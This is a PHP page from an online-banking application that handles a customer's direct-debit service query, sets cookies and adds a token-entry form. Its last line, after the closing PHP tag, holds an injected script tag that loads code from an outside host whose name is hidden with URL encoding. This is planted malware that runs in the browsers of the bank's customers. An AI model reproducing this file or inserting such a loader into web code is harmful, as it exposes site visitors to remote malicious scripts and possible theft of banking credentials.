<?php
//
//
// Created on: <1-Nov-2001 17:37:53 smb>
//
// This source file is part of IVA.
//
// Copyright (C) 1997-2004 Internet de Alta Calidad, S.A. de C.V.  Todos los derechos reservados. All rights reserved.
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, US
//
include_once( "classes/INIFile.php" );
include_once( "classes/eztemplate.php" );
include_once( "classes/ezhttptool.php" );

include_once( "eztransaccion/classes/eztransaccion.php" );
include_once( "ezsession/classes/ezsession.php" );

//06May2010   ACS  Llave ASB para Circular X I		
include("eztransaccion/user/include/controles_javascript.inc");
//06May2010   ACS  Llave ASB para Circular X F
$session =& eZSession::globalSession();

if( !$session->fetch() )
    $session->store();

$ini =& $GLOBALS["GlobalSiteIni"];

$Language = $ini->read_var( "eZTransaccionMain", "Language" );
// $backend = $ini->read_var( "eZTransaccionMain", "Backend" );
$ServerNumber = $ini->read_var( "site", "ServerNumber" );
$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );

$backend = "gw" . $ServerNumber. $DomainPostfix;


include_once( "ezuserbb/classes/ezuser.php" );

$user =& eZUserBB::currentUser();

// DebugBreak();

if ( $user )
{
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "ConDomiServ.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "DomiServ_tpl" => "DomiServ.tpl"
        ) );


    $session =& eZSession::globalSession();

    if ( !$session->fetch() )
    {
        $session->store();
    }

    $tr = new eZTransaccion( );
    $usr = $session->variable( "r_usr" );
    $qki = $session->variable( "r_qki" );
    $priv = $session->variable( "r_priv" );
    $particularFields = "";
    $ret_code = 0;
    $sna_ret_code = 0;

	//NXN-118013, Incorporacion de agrupacion de cuentas I
    // if(empty($_POST['Access'])) {
        // $_POST['Access'] = "FrAc";
    // }

//HB
	if(!empty($_POST['Access']))
		$Access = $_POST['Access'];
	
	if(!empty($_POST['DiasPzo']))
		$DiasPzo = $_POST['DiasPzo'];
		
	if(!empty($_POST['Accion']))
		$Accion = $_POST['Accion'];
		
	if(!empty($_POST['FrAccount']))
		$FrAccount = $_POST['FrAccount'];
		
	if(!empty($_POST['ToAccount']))
		$ToAccount = $_POST['ToAccount'];
		
	if(!empty($_POST['Parent1']))
		$Parent1 = $_POST['Parent1'];
		
	if(!empty($_POST['CustNo']))
		$CustNo = $_POST['CustNo'];
		
	if(!empty($_POST['Cq']))
		$Cq = $_POST['Cq'];
		
	if(!empty($_POST['Apocope']))
		$Apocope = $_POST['Apocope'];
		
	if(!empty($_POST['Empresa']))
		$Empresa = $_POST['Empresa'];
//HB
    
	$ConsAgrp = false;
	
    if(empty($_POST['Access'])) {
        $_POST['Access'] = "FrAc";
		$ConsAgrp = true;
    }
	//NXN-118013, Incorporacion de agrupacion de cuentas F
    $Accion  = "ConDomi";
    switch($_POST['Access']) {
    case "FrAc":
        if (isset($_POST['Access'])) {
            setcookie ( "QueAccess", $_POST['Access'], time() + ( 3600 * 24 * 365 ), "/",  "bb.com.mx", 0 ) or print( "Error: could not set cookie." );
        }
        $DiasPzo = "";
        if ($ConsAgrp)
		{
			$particularFields = "&Accion=".urlencode($Accion)."&Filtro=ConsAgr";;
			//$particularFields = "&Accion=".urlencode($Accion);
		}
		else
		{
			$particularFields = "&Accion=".urlencode($Accion)."&gene5=".urlencode($_POST['FrAccount']);
			
		}
        $tr->blog($qki,"ConDomi", $_POST['FrAccount'], $ToAccount, $DiasPzo, $Parent1, $Accion);
        break;
    case "Confirm":
    case "Process":
        $Parent3 = "LIGA";
        if (isset($_POST['Access'])) {
            setcookie ( "QueAccess", $_POST['Access'], time() + ( 3600 * 24 * 365 ), "/",  "bb.com.mx", 0 ) or print( "Error: could not set cookie." );
        }
		//NXN-118013, Incorporacion de agrupacion de cuentas I	
//        $particularFields = "&Accion=".urlencode($Accion)."&DiasPzo=".urlencode($DiasPzo)."&Parent1=".urlencode($Parent1)."&Parent3=".urlencode($Parent3);
         $particularFields = "&Accion=".urlencode($Accion)."&DiasPzo=".urlencode($DiasPzo)."&Parent1=".urlencode($Parent1)."&Parent3=".urlencode($Parent3);
 	     if ($CustNo != "")
		 {
			 $particularFields.="&gene5=".urlencode($CustNo);
         }
//NXN-118013, Incorporacion de agrupacion de cuentas F		
        $tr->blog($qki,"ConDomi", $_POST['FrAccount'], $ToAccount, $DiasPzo, $Parent1, $Accion);
        break;
    }

    $ret_code = $tr->PostToHost($backend, "/IBnkIIS.dll", "Trxn=arc&Access=".urlencode($_POST['Access'])."&CustID=".urlencode($usr)."&Cadpriv=".urlencode($priv).$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer); // intercambio de archivos de domiciliación

    if (isset($DiasPzo)) {
        setcookie ( "Datos", $DiasPzo, time() + ( 3600 * 24 * 365 ), "/",  "bb.com.mx", 0 ) or print( "Error: could not set cookie." );
    }

    if (isset($Cq)) {
        setcookie ( "Cliente", $Cq, time() + ( 3600 * 24 * 365 ), "/",  "bb.com.mx", 0 ) or print( "Error: could not set cookie." );
    }

    if (isset($Apocope)) {
        setcookie ( "Quien", $Apocope, time() + ( 3600 * 24 * 365 ), "/",  "bb.com.mx", 0 ) or print( "Error: could not set cookie." );
    }

    if (isset($Empresa)) {
        setcookie ( "Que", $Empresa, time() + ( 3600 * 24 * 365 ), "/",  "bb.com.mx", 0 ) or print( "Error: could not set cookie." );
    }

    if (isset($Accion)) {
        setcookie ( "QueAccion", $Accion, time() + ( 3600 * 24 * 365 ), "/",  "bb.com.mx", 0 ) or print( "Error: could not set cookie." );
    }
	//06May2010   ACS  Llave ASB para Circular X I			
	if ($session->variable( "r_tknOp" ) == "si" && $_POST['Access'] == "FrAc" && strpos($transaccion_buffer,"AgruPagIni")===false )
	{
	?>
	<script>

	$(document).ready(function (){ 	
			$('#token_value').focus()
			$('form').bind('submit', function() {
				try
				{
					if ($("#bandera").val() != "envia")
					{
						return false;
					}
					
				}
				catch (err)
				{
					return false;
				}
				
			}
		)
	});
	</script>
	<?php
		$secure_site = $ini->read_var( "site", "SecureServer" ) . $ini->read_var( "site", "ServerNumber" ) . $ini->read_var( "site", "DomainPostfix" );

		$cliente_token="					
			<input type='hidden' id='nomFunc' name='nomFunc' value='clienteasb'>
			<input type='hidden' id='btn_opcion' name='btn_opcion'>
			<table width=98% align=center border=0 class=form_tbl>
				<tr>
					<td colspan=3 align=center>
						<table border=1 width=60% height=60px>
							<tr>
								<td colspan=2 border=1><b> Es necesario capturar su Clave ASB (Acceso Seguro Bajio)</b></td>
							</tr>
							<tr>
								<td colspan=2 align=center > 
									<b>Clave ASB (Acceso Seguro Bajio):</b> 
									<input type=password name=token id=token_value class=inputbox  size=15 maxlength=10 onKeyPress='if (token_valido(event,this) == true){ if (is_Enter(event) == true){validaTknUser(\"ConDomiServ\")}}else{return false}' ></td>
							</tr>
						</table>
					</td>
				</tr>
				<tr>
					<td>
					</td>
					<td align=center>
						<input type=submit name=btn_opcion id=btn_opcionA value=Aceptar class=button onmouseover=\"this.className='buttonON'\" onmouseout=\"this.className='button'\" onclick=\"if (validar_token('token_value','btn_opcionA')) { validaTknUser('ConDomiServ');}else{return false}\" > 
						<input type=button name=btn_opcion id=btn_opcionC value=Cancelar class=button onmouseover=\"this.className='buttonON'\" onmouseout=\"this.className='button'\" onclick=\"document.location.href='https://$secure_site/article/articleview/196/1/7/'\" > 
					</td>
					<td align=left></td>
					<td></td>
				</tr>
			</table>
	";

		$transaccion_buffer=str_replace("<INPUT TYPE=SUBMIT NAME=\"Button\" VALUE=\"Aceptar\">",$cliente_token, $transaccion_buffer);
		$transaccion_buffer=str_replace("<INPUT TYPE=\"SUBMIT\" NAME=\"Button\" VALUE=\"Aceptar\">",$cliente_token, $transaccion_buffer);
		
		//Se Agrega instricción para el token
		$instruccion="<LI>Es necesario capturar su <b>Clave ASB (Acceso Seguro Bajio)</b>, la cual est&aacute; formada por 10 d&iacute;gitos (4 d&iacute;gitos de su <b>NIP</b> actual m&aacute;s 6 d&iacute;gitos de su <b>Clave Din&aacute;mica</b>), para completar la transacci&oacute;n.<LI>Presione bot&oacute;n <EM>Aceptar</EM>";
		$transaccion_buffer=str_replace("<LI>Presione bot&oacute;n <EM>Aceptar</EM>",$instruccion, $transaccion_buffer);
		$transaccion_buffer=str_replace("<li>Presione el bot&oacute;n <em>Aceptar</em>",$instruccion, $transaccion_buffer);
	}
	//06May2010   ACS  Llave ASB para Circular X F			
    $t->set_var( "transaccion_buffer", $transaccion_buffer );
    $t->pparse( "output", "DomiServ_tpl" );

} else {
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "userlogin.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "user_login_tpl" => "userlogin.tpl"
        ) );

    $t->set_var( "redirect_url", "/transaccion/DomiServ/" );
    $t->pparse( "output", "user_login_tpl" );
}

?><script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>